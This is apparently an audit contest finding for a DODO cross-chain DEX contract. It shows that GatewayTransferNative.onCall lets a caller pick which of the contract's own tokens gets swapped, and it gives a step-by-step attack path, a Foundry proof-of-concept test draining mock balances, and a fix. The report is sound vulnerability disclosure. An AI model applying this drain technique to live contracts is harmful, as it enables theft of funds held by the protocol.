# `GatewayTransferNative.onCall` Swaps Arbitrary Contract's ZRC20 When `swapData.fromToken` Mismatches Deposited `zrc20`

### Summary

When [`GatewayTransferNative.onCall`](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayTransferNative.sol#L357-L423) processes a cross-chain message with non-empty `swapData`, it fails to ensure that the `params.fromToken`  matches the `zrc20` token actually received from the source chain. Instead, `GatewayTransferNative` approves its *own balance* of `params.fromToken` for the swap, using the deposited amount of `zrc20` as the approval limit. An attacker can deposit a low-value `zrc20` and provide `swapData` to make `GatewayTransferNative` swap a different, valuable token it holds, leading to fund drain. 

### Root Cause


The bug exists in how `GatewayTransferNative.onCall` handles the token for the DODO swap on ZetaChain.

1.  **Cross-chain Message:** `GatewayTransferNative.onCall` receives `amount` of `zrc20` tokens from ZetaChain's Gateway, originating from a source chain. It also receives a `message`.

    ```solidity
    function onCall(
        MessageContext calldata context,
        address zrc20, // Token received from source chain
        uint256 amount, // Amount of zrc20 received
        bytes calldata message // User-controlled payload (after externalId)
    ) external override onlyGateway {
        // ...
        bytes calldata _message = message[32:]; // Original payload
        (DecodedNativeMessage memory decoded, MixSwapParams memory params) =
            SwapDataHelperLib.decodeNativeMessage(_message);
        // params.fromToken and params.fromTokenAmount are from _message (via decoded.swapData)
        // ...
        uint256 platformFeesForTx = _handleFeeTransfer(zrc20, amount);
        uint256 amountAfterFee = amount - platformFeesForTx;
        address receiver = address(uint160(bytes20(decoded.receiver)));
        // ...
        if (decoded.targetZRC20 == zrc20) { // If no swap is needed
            // ...
        } else { // Swap is needed
            uint256 outputAmount = _doMixSwap(decoded.swapData, amountAfterFee, params);
            // ... transfer outputAmount of decoded.targetZRC20 to receiver
        }
    }
    ```

2.  **Payload Decoding:** The `_message` is decoded via `SwapDataHelperLib.decodeNativeMessage`. The `decoded.swapData` field within this payload determines `params.fromToken` and `params.fromTokenAmount`. These are fully controlled by the user that initiated the cross-chain call via `GatewaySend`.

3.  **Approval in `_doMixSwap`:** The `_doMixSwap` function is called with `amountAfterFee` and `params`.

    ```solidity
    function _doMixSwap(
        bytes memory swapData, // This is decoded.swapData
        uint256 amount,        // This is amountAfterFee (quantity of initial zrc20)
        MixSwapParams memory params
    ) internal returns (uint256 outputAmount) {
        if (swapData.length == 0) {
            return amount;
        }

        // @audit Approves params.fromToken (from payload) using 'amount' 
        // @audit If params.fromToken != zrc20, it approves its *own* balance of params.fromToken.
        IZRC20(params.fromToken).approve(DODOApprove, amount); 
        return IDODORouteProxy(DODORouteProxy).mixSwap{ value: msg.value }( 
            params.fromToken,
            params.toToken,
            params.fromTokenAmount, // Uses amount from payload for the swap
            // ... other params
        );
    }
    ```

    The core issue is: `IZRC20(params.fromToken).approve(DODOApprove, amount);`.
    *   `params.fromToken` can be any token address specified by the user in the payload.
    *   `amount` is the quantity of the `zrc20` that was actually deposited and received by `onCall` (after fees).
    *   **There is no check to ensure that `params.fromToken` is the same as the `zrc20` token prior to `_doMixSwap`**
    *   If `params.fromToken` is different from `zrc20`, `GatewayTransferNative` approves `DODOApprove` to spend `amount` units of its *own holdings* of `params.fromToken`.

4.  **DODO Swap Execution:** The subsequent `IDODORouteProxy.mixSwap` call then uses `params.fromTokenAmount` as the quantity of `params.fromToken` to swap. If `params.fromTokenAmount` is less than or equal to `amount`, the DODO swap will proceed, taking `params.fromTokenAmount` of `params.fromToken` from `GatewayTransferNative`'s balance.
   
The bug allows anyone to specify any `params.fromToken` they want and use the `amount` of the `zrc20` they deposited as the approval limit for that `params.fromToken`. The swap then uses `params.fromTokenAmount`.

### Internal Pre-conditions

1.  The `GatewayTransferNative` contract must have a non-zero balance of a ZRC20 token that the attacker intends to drain. This condition is highly likely to be met for various tokens over time, as the contract's refund mechanism can cause it to accumulate different ZRC20s.

### External Pre-conditions

1.  The DODO protocol on ZetaChain must have a liquidity pool for the swap pair defined in `params.fromToken` / `params.toToken`.
2.  ZetaChain's Gateway and the source chain's Gateway must be operational to relay the transaction and payload.


### Attack Path

1.  **Pre-condition:** `GatewayTransferNative` contract holds `1e18` wei of `ETH.ETH` ZRC20.
2.  **Attacker's Action:** Attacker initiates a cross-chain transaction via `GatewaySend.depositAndCall` that will trigger `GatewayTransferNative.onCall`.
    *   Attacker deposits `1e18` wei of DAI on the Ethereum chain. This `DAI` becomes `DAI.ETH` ZRC20 in `GatewayTransferNative.onCall`, and `amount` becomes `1e18`.
    *   The `payload` sent with this transaction is crafted so that when `SwapDataHelperLib.decodeNativeMessage` processes it:
        *   `decoded.targetZRC20`: `address(USDC.ETH)`.
        *   `decoded.receiver`: Attacker's ZetaChain address.
        *   `decoded.swapData`:
            *   `params.fromToken`: `address(ETH.ETH)`.
            *   `params.toToken`: `address(USDC.ETH)`.
            *   `params.fromTokenAmount`: `1e18`.
            *   `params.minReturnAmount`: `0`.
3.  **Execution within `GatewayTransferNative.onCall`:**
    *   `onCall` receives `amount = 1e18` of `zrc20 = DAI.ETH`.
    *   Assume platform fees are zero. `amountAfterFee` remains `1e18`.
    *   Since `decoded.targetZRC20 (USDC.ETH) == zrc20 (DAI.ETH)` is false, the flow will proceed to the `else` block.
    *   `_doMixSwap(decoded.swapData, 1e18, params)` is called.
        *   Inside `_doMixSwap`: `IZRC20(params.fromToken).approve(DODOApprove, amount);` executes as `IZRC20(ETH.ETH).approve(DODOApprove, 1e18);`. The `GatewayTransferNative` contract approves `DODOApprove` to spend `1e18` of its *own* `ETH.ETH`.
        *   `IDODORouteProxy(DODORouteProxy).mixSwap(...)` is called with `params.fromTokenAmount = 1e18` of `params.fromToken = ETH.ETH`.
        *   The DODO swap pulls `1e18` `ETH.ETH` from `GatewayTransferNative`'s balance and swaps them for `USDC.ETH`.
    *   The `outputAmount` (now `USDC.ETH`) is then transferred to the attacker's `receiver` address on ZetaChain.
4.  **Result**: The `GatewayTransferNative` contract's `ETH.ETH` balance is reduced by `1e18` wei. The attacker used `1e18` wei of `DAI` (~$1) to achieve this.

### Impact

Direct loss of ZRC20 token holdings from the `GatewayTransferNative` contract. An attacker can choose a valuable token held by `GatewayTransferNative` and swap it using a deposit of a less valuable token, limited only by the approval limits. This can be repeated to drain targeted balances. The swapped funds are then delivered to the attacker on ZetaChain.

Add the following test to `test/GatewayTransferNative.t.sol`:

```solidity
/// @dev This bug allows anyone to use arbitary ZRC20 for swap in GatewayTransferNative
/// @custom:command forge test --match-contract GatewayTransferNativeTest --match-test test_FromTokenNoCheck --fork-url https://zetachain-evm.blockpi.network/v1/rpc/public
function test_FromTokenNoCheck() public {
    address attacker = makeAddr("attacker");
    address targetContract = address(gatewayTransferNative);

    // Assets
    ERC20Mock dai = new ERC20Mock("DAI", "DAI", 18);
    ZRC20Mock zrc20DAI = new ZRC20Mock("ZetaChain DAI Ethereum", "DAI.ETH", 18);
    ZRC20Mock zrc20USDC = new ZRC20Mock("ZetaChain USDC Ethereum", "USDC.ETH", 18); // For demo purpose, DODO mock only support 18 decimals
    ZRC20Mock zrc20ETH = new ZRC20Mock("ZetaChain WBTC Ethereum", "WBTC.ETH", 18);
    uint256 amount = 1e18;

    // Balances
    dai.mint(attacker, amount); // 0.00xxx DAI
    zrc20DAI.mint(address(gatewayZEVM), amount); // Deposited DAI.ETH on ZetaChain
    zrc20ETH.mint(targetContract, amount); // 1 ETH.ETH e.g. for refund failed cross-chain tx
    zrc20USDC.mint(address(dodoRouteProxyZ), 2500 * 1e18); // Swaps Liquidity

    // Aprovals
    vm.prank(attacker);
    dai.approve(address(gatewaySendA), amount);

    uint32 dstChainId = 7000;
    address asset = address(dai);
    address targetZRC20 = address(zrc20USDC); // !!!! To trigger the swap logic
    bytes memory sender = abi.encodePacked(attacker);
    bytes memory receiver = abi.encodePacked(attacker);

    // 1 ETH = 2500 USDC, no slippage for simplicity
    dodoRouteProxyZ.setPrice(address(zrc20ETH), address(zrc20USDC), 2500 * 1e18);

    // Gateways
    gatewayA.setZRC20(address(dai), address(zrc20DAI));

    bytes memory swapDataZ = encodeCompressedMixSwapParams(
        address(zrc20ETH), // !!!!
        address(zrc20USDC), // !!!!
        amount,
        0,
        0,
        new address[](1),
        new address[](1),
        new address[](1),
        0,
        new bytes[](1),
        abi.encode(address(0), 0),
        block.timestamp + 600
    );
    bytes memory payload = encodeNativeMessage(targetZRC20, sender, receiver, swapDataZ);

    vm.prank(attacker);
    gatewaySendA.depositAndCall(targetContract, amount, asset, dstChainId, payload);

    // Deposit 1 DAI got 2500 USDC
    assertEq(dai.balanceOf(attacker), 0);
    assertEq(zrc20USDC.balanceOf(attacker), 2500 * 1e18);
}
```

### Mitigation

In `GatewayTransferNative.oncall` ensures that the token being swapped (`params.fromToken`) is the same as the token received by `onCall` (`zrc20`). This ensures that only the funds actually deposited into `GatewayTransferNative` for the current `onCall` transaction are used for the subsequent DODO swap.
